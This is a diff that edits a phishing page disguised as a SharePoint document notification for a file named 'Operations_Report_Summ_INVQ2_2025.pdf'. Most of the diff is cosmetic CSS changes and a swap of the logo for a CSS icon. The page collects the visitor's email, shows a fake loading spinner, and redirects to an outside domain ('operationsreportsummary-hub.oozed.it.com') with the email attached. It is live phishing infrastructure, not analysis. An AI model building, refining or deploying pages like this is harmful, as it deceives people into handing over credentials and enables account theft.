@@ -6,144 +6,166 @@
 <title>SharePoint Document Notification</title>
 <style>
 body {
-font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-background-color: #f3f6fb;
-margin: 0;
-padding: 0;
-display: flex;
-flex-direction: column;
-align-items: center;
-justify-content: center;
-height: 100vh;
+ font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+ background-color: #f3f6fb;
+ margin: 0;
+ padding: 0;
+ display: flex;
+ flex-direction: column;
+ align-items: center;
+ justify-content: center;
+ height: 100vh;
 }
 .header {
-display: flex;
-align-items: center;
-margin-bottom: 10px;
+ display: flex;
+ align-items: center;
+ margin-bottom: 10px;
 }
 .logo {
-width: 40px;
-height: 40px;
-background-color: #0078d4;
-border-radius: 8px;
-display: flex;
-align-items: center;
-justify-content: center;
-color: #fff;
-font-weight: bold;
-font-size: 18px;
-margin-right: 10px;
+ width: 40px;
+ height: 40px;
+ background-color: #0078d4;
+ border-radius: 8px;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ color: #fff;
+ font-weight: bold;
+ font-size: 18px;
+ margin-right: 10px;
 }
 .title {
-font-size: 24px;
-color: #0078d4;
-font-weight: bold;
+ font-size: 24px;
+ color: #0078d4;
+ font-weight: bold;
 }
 .sub-header {
-font-size: 15px;
-margin-bottom: 20px;
-color: #444;
+ font-size: 15px;
+ margin-bottom: 20px;
+ color: #444;
 }
 .document-box {
-background: #fff;
-padding: 20px 25px;
-box-shadow: 0 0 20px rgba(0,0,0,0.1);
-border-radius: 10px;
-text-align: center;
-width: 95%;
-max-width: 400px;
-animation: pulse 3s infinite;
+ background: #fff;
+ padding: 20px 25px;
+ box-shadow: 0 0 20px rgba(0,0,0,0.1);
+ border-radius: 10px;
+ text-align: center;
+ width: 95%;
+ max-width: 400px;
+ animation: pulse 3s infinite;
 }
 @keyframes pulse {
-0% { box-shadow: 0 0 15px rgba(0, 120, 212, 0.3); }
-50% { box-shadow: 0 0 25px rgba(0, 120, 212, 0.5); }
-100% { box-shadow: 0 0 15px rgba(0, 120, 212, 0.3); }
+ 0% { box-shadow: 0 0 15px rgba(0, 120, 212, 0.3); }
+ 50% { box-shadow: 0 0 25px rgba(0, 120, 212, 0.5); }
+ 100% { box-shadow: 0 0 15px rgba(0, 120, 212, 0.3); }
 }
-.word-logo {
-width: 50px;
-margin-bottom: 15px;
+.doc-icon {
+ width: 60px;
+ height: 80px;
+ background-color: white;
+ border: 2px solid #0078d4;
+ border-radius: 8px;
+ display: flex;
+ flex-direction: column;
+ align-items: center;
+ justify-content: start;
+ overflow: hidden;
+ margin: 0 auto 15px auto;
+}
+.doc-header {
+ width: 100%;
+ height: 20px;
+ background-color: #0078d4;
+}
+.doc-body {
+ flex-grow: 1;
+ display: flex;
+ align-items: center;
+ justify-content: center;
+ font-weight: bold;
+ color: #0078d4;
+ font-size: 18px;
 }
 .file-name {
-font-weight: bold;
-font-size: 18px;
-color: #333;
+ font-weight: bold;
+ font-size: 18px;
+ color: #333;
 }
 .file-size {
-font-size: 13px;
-color: #666;
-margin-top: 5px;
+ font-size: 13px;
+ color: #666;
+ margin-top: 5px;
 }
 .instruction {
-margin-top: 20px;
-font-size: 14px;
-color: #555;
+ margin-top: 20px;
+ font-size: 14px;
+ color: #555;
 }
 input[type="email"] {
-margin-top: 10px;
-width: 90%;
-padding: 10px;
-border: 1px solid #ccc;
-border-radius: 5px;
-font-size: 14px;
+ margin-top: 10px;
+ width: 90%;
+ padding: 10px;
+ border: 1px solid #ccc;
+ border-radius: 5px;
+ font-size: 14px;
 }
 button {
-margin-top: 20px;
-background-color: #0078d4;
-color: #fff;
-border: none;
-padding: 12px 20px;
-font-size: 15px;
-border-radius: 5px;
-cursor: pointer;
-width: 100%;
+ margin-top: 20px;
+ background-color: #0078d4;
+ color: #fff;
+ border: none;
+ padding: 12px 20px;
+ font-size: 15px;
+ border-radius: 5px;
+ cursor: pointer;
+ width: 100%;
 }
 button:hover {
-background-color: #005a9e;
+ background-color: #005a9e;
 }
 .footer {
-margin-top: 25px;
-font-size: 11px;
-color: #999;
-text-align: center;
+ margin-top: 25px;
+ font-size: 11px;
+ color: #999;
+ text-align: center;
 }
-
 /* Loading Screen */
 .loading-screen {
-display: none;
-position: fixed;
-background-color: #ffffff;
-top: 0;
-left: 0;
-width: 100%;
-height: 100%;
-z-index: 9999;
-flex-direction: column;
-justify-content: center;
-align-items: center;
+ display: none;
+ position: fixed;
+ background-color: #ffffff;
+ top: 0;
+ left: 0;
+ width: 100%;
+ height: 100%;
+ z-index: 9999;
+ flex-direction: column;
+ justify-content: center;
+ align-items: center;
 }
 .blurred-document {
-width: 250px;
-height: auto;
-filter: blur(4px);
-margin-bottom: 20px;
+ width: 250px;
+ height: auto;
+ filter: blur(4px);
+ margin-bottom: 20px;
 }
 .spinner {
-border: 5px solid #f3f3f3;
-border-top: 5px solid #0078d4;
-border-radius: 50%;
-width: 40px;
-height: 40px;
-animation: spin 1s linear infinite;
-margin-bottom: 15px;
+ border: 5px solid #f3f3f3;
+ border-top: 5px solid #0078d4;
+ border-radius: 50%;
+ width: 40px;
+ height: 40px;
+ animation: spin 1s linear infinite;
+ margin-bottom: 15px;
 }
 @keyframes spin {
-0% { transform: rotate(0deg); }
-100% { transform: rotate(360deg); }
+ 0% { transform: rotate(0deg); }
+ 100% { transform: rotate(360deg); }
 }
 .loading-text {
-font-size: 16px;
-color: #0078d4;
-font-weight: bold;
+ font-size: 16px;
+ color: #0078d4;
+ font-weight: bold;
 }
 </style>
 </head>
@@ -165,7 +187,10 @@ font-weight: bold;
 <div class="sub-header">A new document is now available for your review.</div>
 
 <div class="document-box">
- <img class="word-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Microsoft_Word_2013-2019_logo.svg" alt="Word Logo">
+ <div class="doc-icon">
+ <div class="doc-header"></div>
+ <div class="doc-body">DOC</div>
+ </div>
  <div class="file-name">Operations_Report_Summ_INVQ2_2025.pdf</div>
  <div class="file-size">9.90 MB</div>
 
@@ -195,7 +220,7 @@ if (email) {
 document.body.style.overflow = "hidden";
 loadingScreen.style.display = "flex";
 setTimeout(function() {
-window.location.href = "https://operationsreportsummary-hub.oozed.it.com/1RHdb?email=" + encodeURIComponent(email);
+window.location.href = "https://operationsreportsummary-hub.oozed.it.com/1RHdb/?email=" + encodeURIComponent(email);
 }, 2500); // 2.5 seconds loading screen
 }
 });
